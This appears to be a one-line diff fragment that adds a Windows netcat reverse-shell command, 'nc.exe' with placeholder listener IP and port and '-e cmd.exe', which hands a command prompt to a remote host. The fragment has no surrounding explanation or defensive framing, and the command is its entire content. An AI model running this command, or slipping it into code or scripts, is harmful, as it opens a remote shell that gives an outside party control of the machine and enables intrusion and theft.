@@ -1,0 +1,1 @@
+nc.exe [LIP] [LP] -e cmd.exe
